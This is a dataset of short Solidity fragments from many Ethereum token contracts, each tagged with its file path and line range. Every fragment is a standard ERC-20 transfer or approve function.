    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="84" endline="87" pcid="4633">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="70" endline="73" pcid="8455">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="70" endline="73" pcid="8485">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="74" endline="77" pcid="9347">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="83" endline="86" pcid="6322">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="73" endline="76" pcid="1295">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="73" endline="76" pcid="6320">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="80" endline="83" pcid="8457">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="85" endline="88" pcid="4273">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="67" endline="70" pcid="3840">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="74" endline="77" pcid="331">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="71" endline="74" pcid="8380">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="75" endline="78" pcid="2465">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="71" endline="74" pcid="1036">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="81" endline="84" pcid="7609">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="82" endline="85" pcid="3552">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="70" endline="73" pcid="6749">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="86" endline="89" pcid="1868">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="84" endline="87" pcid="2437">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="72" endline="75" pcid="2786">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="84" endline="87" pcid="4435">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="84" endline="87" pcid="2706">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="83" endline="86" pcid="7168">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="73" endline="76" pcid="8600">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="182" endline="185" pcid="3823">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="71" endline="74" pcid="3957">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="77" endline="80" pcid="8169">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="74" endline="77" pcid="7488">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="71" endline="74" pcid="7607">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="81" endline="84" pcid="3959">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="83" endline="86" pcid="9046">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="71" endline="74" pcid="1549">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="84" endline="87" pcid="1201">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="80" endline="83" pcid="6751">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="71" endline="74" pcid="5374">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="86" endline="89" pcid="8201">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="584" endline="587" pcid="1207">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="81" endline="84" pcid="6307">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="74" endline="77" pcid="4433">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="71" endline="74" pcid="6305">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="83" endline="86" pcid="2270">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="74" endline="77" pcid="4646">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="73" endline="76" pcid="6764">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="83" endline="86" pcid="2019">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="83" endline="86" pcid="6766">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="84" endline="87" pcid="265">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="84" endline="87" pcid="4648">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="84" endline="87" pcid="682">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="81" endline="84" pcid="5376">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="67" endline="70" pcid="1627">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="84" endline="87" pcid="3762">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="74" endline="77" pcid="2977">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="86" endline="89" pcid="2202">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="70" endline="73" pcid="5389">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="69" endline="72" pcid="9293">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="80" endline="83" pcid="5391">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="81" endline="84" pcid="2753">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="84" endline="87" pcid="7594">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="76" endline="79" pcid="1866">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="77" endline="80" pcid="1629">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="80" endline="83" pcid="8022">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="84" endline="87" pcid="5149">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="74" endline="77" pcid="5147">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="72" endline="75" pcid="3059">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="73" endline="76" pcid="2268">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="74" endline="77" pcid="7592">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="73" endline="76" pcid="3668">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="73" endline="76" pcid="1950">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="72" endline="75" pcid="3972">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="82" endline="85" pcid="3061">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="82" endline="85" pcid="3974">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="73" endline="76" pcid="8882">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="73" endline="76" pcid="774">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="70" endline="73" pcid="5404">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="80" endline="83" pcid="8487">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="72" endline="75" pcid="1785">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="73" endline="76" pcid="6779">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="80" endline="83" pcid="5406">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="73" endline="76" pcid="860">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="39" endline="42" pcid="1536">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="34" endline="37" pcid="1535">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="76" endline="79" pcid="82">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="71" endline="74" pcid="5419">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="80" endline="83" pcid="8785">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="71" endline="74" pcid="3775">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="84" endline="87" pcid="466">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="80" endline="83" pcid="2825">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="81" endline="84" pcid="5421">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="82" endline="85" pcid="1527">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="80" endline="83" pcid="2113">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="84" endline="87" pcid="348">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="85" endline="88" pcid="8710">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="83" endline="86" pcid="1297">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="71" endline="74" pcid="5434">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="89" endline="92" pcid="912">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="74" endline="77" pcid="9362">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="46" endline="49" pcid="107">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="71" endline="74" pcid="213">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="84" endline="87" pcid="4420">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="80" endline="83" pcid="8367">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="83" endline="86" pcid="6781">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="74" endline="77" pcid="4418">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="83" endline="86" pcid="862">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="87" endline="90" pcid="581">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="144" endline="147" pcid="7365">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="84" endline="87" pcid="8674">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="81" endline="84" pcid="5436">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="80" endline="83" pcid="1023">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="146" endline="149" pcid="2387">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="50" endline="53" pcid="6290">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="589" endline="592" pcid="1208">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="82" endline="85" pcid="6282">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="74" endline="77" pcid="4661">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="72" endline="75" pcid="6280">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="84" endline="87" pcid="4663">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="81" endline="84" pcid="7792">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="690" endline="693" pcid="2215">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="72" endline="75" pcid="1525">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="71" endline="74" pcid="7790">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="83" endline="86" pcid="6053">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="73" endline="76" pcid="6051">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="83" endline="86" pcid="230">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="67" endline="70" pcid="8852">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="72" endline="75" pcid="2450">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="80" endline="83" pcid="6267">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="70" endline="73" pcid="1021">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="71" endline="74" pcid="7699">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
